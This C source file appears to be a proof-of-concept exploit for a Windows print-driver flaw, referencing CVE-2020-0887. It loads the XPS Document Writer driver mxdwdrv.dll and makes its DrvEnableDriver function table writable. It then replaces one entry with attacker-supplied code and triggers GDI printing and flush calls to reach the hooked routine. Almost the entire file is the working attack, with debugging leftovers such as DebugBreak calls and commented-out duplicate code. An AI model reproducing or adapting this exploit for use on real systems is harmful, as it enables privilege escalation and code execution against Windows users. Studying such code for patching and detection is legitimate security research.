#include <windows.h>
#include <ntstatus.h>
#include <stdio.h>
#include <winddi.h>
#include <winspool.h> 

#pragma comment(lib, "ntdll.lib")


typedef BOOL(__stdcall* gDrvEnableDriver)(ULONG, ULONG, DRVENABLEDATA*);
typedef NTSTATUS(__stdcall* pDrvEnableDriver)(PVOID p);
pDrvEnableDriver		g_originalDED = NULL;
PVOID g_ppDED = NULL;
typedef void(__stdcall* gNtGdiFlushUserBatch)();
typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PVOID FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};

} PEB, * PPEB;


typedef struct _TEB
{
	PVOID NtTib1;
	PVOID NtTib2;
	PVOID NtTib3;
	PVOID NtTib4;
	PVOID NtTib5;
	PVOID NtTib6;
	PVOID NtTib7;
	PVOID EnvironmentPointer;
	PVOID ClientId1;
	PVOID ClientId2;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	PPEB ProcessEnvironmentBlock;

	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	PVOID CsrClientThread;
	PVOID Win32ThreadInfo;

} TEB, * PTEB;


HDC hdc = NULL;



void testData() {
	 EndDoc(hdc);
	 printf("SUCCESS HOOK");
}

int main() {
	DOCINFO docinfo;
	PTEB teb = NtCurrentTeb();
	PPEB peb = teb->ProcessEnvironmentBlock;
	DWORD prot;
	DWORD err = NULL;
	DRVENABLEDATA pded;
	MEMORY_BASIC_INFORMATION thunkMemInfo;
	RtlZeroMemory(&pded, sizeof(DRVENABLEDATA));
	printf("TEB: %p\n", teb);
	printf("PEB: %p\n", teb);
	//DRVFN fakeFunc;
	//HMODULE drilib = LoadLibraryEx(L"C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_ce3301b66255a0fb\Amd64\mxdwdrv.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
	//HMODULE drilib = LoadLibraryExA(TEXT("mxdwdrv.dll"), NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
	/*HMODULE drilib = LoadLibraryEx(L"C:\\cve2020-0887\\mxdwdrv.dll",NULL,LOAD_WITH_ALTERED_SEARCH_PATH);
	gDrvEnableDriver fDrvEnableDriver = (gDrvEnableDriver)GetProcAddress(drilib, "DrvEnableDriver");
	if (fDrvEnableDriver != NULL) {
		printf("SUCCESS\n");
		(fDrvEnableDriver)(DDI_DRIVER_VERSION_NT5_01_SP1, sizeof(pded),&pded);
		printf("PDED: %p\n", pded);
		printf("PDED: %p\n", (pded.pdrvfn));
		printf("PDED: %p\n", (pded.pdrvfn+17));
		if (!VirtualProtect(pded.pdrvfn+17, sizeof(DRVENABLEDATA), PAGE_READWRITE, &thunkMemInfo)) {
			printf("false");
			system("pause");
			return 0;
		}
		else {
			
			printf("[+]Success set ReadWrite\n");
			void (*testfn_ptr)() = &testData;
			(pded.pdrvfn+17)->pfn = (*testfn_ptr);
		}
		
		DebugBreak();

	}*/

	hdc = CreateDCA(0, "Microsoft XPS Document Writer", 0, 0);

	/*if (hdc == 0) {
		system("pause");
		return 0;
	}*/
	printf("HDC: %p", hdc);
	docinfo.cbSize = sizeof(DOCINFO);
	docinfo.lpszDocName = TEXT("C:\\test\\test.txt");
	docinfo.lpszOutput = TEXT("C:\\test\\test.xps");
	docinfo.lpszDatatype = (LPTSTR)(0);
	docinfo.fwType = 0;


	StartDoc(hdc, &docinfo);
	printf("StartDoc: %d\n", GetLastError());
	StartPage(hdc);
	printf("Start Page: %d\n", GetLastError());

	HMODULE drilib = LoadLibrary(TEXT("mxdwdrv.dll"));
	if (!drilib) {
		printf("false");
	}
	gDrvEnableDriver fDrvEnableDriver = (gDrvEnableDriver)GetProcAddress(drilib, "DrvEnableDriver");
	if (fDrvEnableDriver != NULL) {
		printf("SUCCESS\n");
		(fDrvEnableDriver)(DDI_DRIVER_VERSION_NT5_01_SP1, sizeof(pded), &pded);
		printf("PDED: %p\n", pded);
		printf("PDED: %p\n", (pded.pdrvfn));
		printf("PDED: %p\n", (pded.pdrvfn + 17));
		if (!VirtualProtect(pded.pdrvfn + 17, sizeof(DRVENABLEDATA), PAGE_READWRITE, &thunkMemInfo)) {
			printf("false");
			system("pause");
			return 0;
		}
		else {

			printf("[+]Success set ReadWrite\n");
			void (*testfn_ptr)() = &testData;
			(pded.pdrvfn + 17)->pfn = (*testfn_ptr);
		}



	}
	DebugBreak();
	TextOutA(hdc, 0, 0, ("Test String"), 9);
	printf("Text%d\n", GetLastError());
	HMODULE win32lib = LoadLibrary(TEXT("win32u.dll"));
	if (win32lib == 0) {
		printf("Not found win32lib");
		system("pause");
		return 0;
	}
	printf("Success Load win32u\n");
	gNtGdiFlushUserBatch pfnNtTestAlert = (gNtGdiFlushUserBatch)GetProcAddress(win32lib, "NtGdiFlush");

	if (pfnNtTestAlert != 0) {
		pfnNtTestAlert();
		printf("Success\n");
		system("pause");
	}
	else {
		printf("Failt GetProc");
		system("pause");
	}

	system("pause");
	return 0;
}